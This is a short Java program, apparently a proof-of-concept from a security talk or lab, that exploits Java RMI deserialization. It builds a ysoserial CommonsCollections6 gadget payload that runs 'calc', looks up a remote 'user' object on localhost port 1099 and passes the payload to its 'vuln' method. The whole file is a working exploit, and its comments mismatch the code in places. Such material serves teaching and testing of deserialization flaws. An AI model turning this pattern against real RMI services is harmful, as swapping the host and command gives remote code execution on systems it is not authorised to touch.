package org.example;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import ysoserial.payloads.CommonsCollections6;

public class AttackServerByObject {

    public static void main(String[] args) {

        try {
            // create the malicious object via ysososerial
            Object payload = new CommonsCollections6().getObject("calc");

            // Lookup the remote object that is registered as "bsides"
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
            User user = (User)registry.lookup("user");


            // pass it to the target by calling the Poke method
            user.vuln(payload);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}